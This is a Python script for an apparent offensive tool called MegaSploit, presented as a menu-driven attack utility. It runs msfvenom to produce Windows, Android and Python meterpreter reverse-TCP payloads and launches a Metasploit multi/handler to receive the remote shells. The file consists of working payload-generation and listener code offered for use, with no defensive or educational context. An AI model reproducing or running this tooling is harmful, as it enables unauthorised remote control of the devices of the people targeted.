import os
import sys
import time
import socket
import requests
import subprocess
from InquirerPy import inquirer
from pystyle import *

#=-----------=#
LHOST = socket.gethostbyname(socket.gethostname())
LPORT = 4444

def exploit(device, lhost , lport):
    ASK = inquirer.confirm(message="Do You Want To Start Exploiting?", default=True).execute()
    if ASK:
        print(f"{Col.red}[{Col.yellow}+{Col.red}] {Col.reset}Starting..!{Col.reset}")
        os.system(f'msfconsole -q -x "use exploit/multi/handler; set payload {device}/meterpreter/reverse_tcp; set lhost {lhost}; set lport {lport}; exploit;"')
    else:
        print(f"{Col.red}[{Col.yellow}+{Col.red}] {Col.reset}OK..!{Col.reset}")
def run(_version_):
    global LHOST , LPORT
    System.Clear()
    BANNER = """
                                                                                                        
▀████▄     ▄███▀███▀▀▀███  ▄▄█▀▀▀█▄█      ██      ▄█▀▀▀█▄████▀▀▀██▄▀████▀     ▄▄█▀▀██▄ ▀████▀██▀▀██▀▀███
  ████    ████   ██    ▀█▄██▀     ▀█     ▄██▄    ▄██    ▀█ ██   ▀██▄ ██     ▄██▀    ▀██▄ ██ █▀   ██   ▀█
  █ ██   ▄█ ██   ██   █  ██▀       ▀    ▄█▀██▄   ▀███▄     ██   ▄██  ██     ██▀      ▀██ ██      ██     
  █  ██  █▀ ██   ██████  ██            ▄█  ▀██     ▀█████▄ ███████   ██     ██        ██ ██      ██     
  █  ██▄█▀  ██   ██   █  ▄█▄    ▀████  ████████  ▄     ▀██ ██        ██     ▄█▄      ▄██ ██      ██     
  █  ▀██▀   ██   ██     ▄███▄     ██  █▀      ██ ██     ██ ██        ██    ▄███▄    ▄██▀ ██      ██     
▄███▄ ▀▀  ▄████▄██████████ ▀▀███████▄███▄   ▄████▄▀█████▀▄████▄    ██████████ ▀▀████▀▀ ▄████▄  ▄████▄   
                                                                                                                         
"""

    print(Colorate.Vertical(Colors.DynamicMIX((Col.red, Col.dark_red)), Center.XCenter(BANNER)))
    print(f"{Col.red}[{Col.yellow}+{Col.red}] {Col.reset}Current Version is {Col.yellow}{_version_}{Col.reset}")
    time.sleep(0.5)
    print(f"{Col.red}[{Col.yellow}+{Col.red}] {Col.reset}Checking For Updates...!")
    CURRENT_VERSION = requests.get("https://raw.githubusercontent.com/U8SEF/MegaSploit/main/version").text.splitlines()[0]
    time.sleep(1.5)
    if _version_ == CURRENT_VERSION:
        print(f"{Col.red}[{Col.yellow}+{Col.red}] {Col.reset}Latest Update Installed Successfully.")
        USER_INPUT = inquirer.rawlist(
            message="Select Service:",
            choices=[
                "Generate Payload With Metasploit",
                "Modify Settings",
                "Exit",
            ],
            mandatory_message="Cannot skip",
            default=1,

        ).execute()
        if USER_INPUT == "Generate Payload With Metasploit":
            PAYLOAD_INPUT = inquirer.rawlist(
                message="Select Payload:",
                choices=[
                    "Windows Payload",
                    "Android Payload",
                    "Python Payload",
                ],
                mandatory_message="Cannot skip",
                default=1,

            ).execute()
            if PAYLOAD_INPUT == "Windows Payload":
                with open('/dev/null', 'w') as nullfile:
                    subprocess.run(f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe -o MegaPayload.exe", shell=True, stdout=nullfile, stderr=subprocess.STDOUT)
                print(f"{Col.red}[{Col.yellow}+{Col.red}] {Col.reset}The Payload Has Been Created...!{Col.yellow}{Col.reset}")
                exploit(device="windows", lhost=LHOST , lport=LPORT)
            elif PAYLOAD_INPUT == "Android Payload":
                with open('/dev/null', 'w') as nullfile:
                    subprocess.run(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -o MegaPayload.apk", shell=True, stdout=nullfile, stderr=subprocess.STDOUT)
                print(f"{Col.red}[{Col.yellow}+{Col.red}] {Col.reset}The Payload Has Been Created...!{Col.yellow}{Col.reset}")
                exploit(device="android", lhost=LHOST , lport=LPORT)
            else:
                with open('/dev/null', 'w') as nullfile:
                    subprocess.run(f"msfvenom -p python/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -o MegaPayload.py", shell=True, stdout=nullfile, stderr=subprocess.STDOUT)
                print(f"{Col.red}[{Col.yellow}+{Col.red}] {Col.reset}The Payload Has Been Created...!{Col.yellow}{Col.reset}")
                exploit(device="python", lhost=LHOST , lport=LPORT)
        elif USER_INPUT == "Modify Settings":
            print(f"{Col.red}[{Col.yellow}+{Col.red}] {Col.reset}Current Setting -> {Col.yellow}{LHOST}:{LPORT}")
            LHOST = input(f"{Col.red}[{Col.yellow}?{Col.red}] {Col.reset}LHOST{Col.yellow}=")
            LPORT = input(f"{Col.red}[{Col.yellow}?{Col.red}] {Col.reset}LPORT{Col.yellow}=")
            print(Col.reset)
            print(f"{Col.red}[{Col.yellow}+{Col.red}] {Col.reset}Settings Have Been Saved...!{Col.yellow}{Col.reset}")
            time.sleep(1.5)
            run(_version_=_version_)
        else:
            print(f"{Col.red}[{Col.yellow}+{Col.red}] {Col.reset}Well, Hope To See You Later...{Col.reset}")
            sys.exit()

    else:
        print(f"{Col.red}[{Col.yellow}+{Col.red}] {Col.reset}New Update Available...{Col.yellow}{CURRENT_VERSION}{Col.reset}")
        print(f"{Col.red}[{Col.yellow}+{Col.red}] {Col.reset}To Update Try That Command => \"python update.py\"")
        sys.exit()
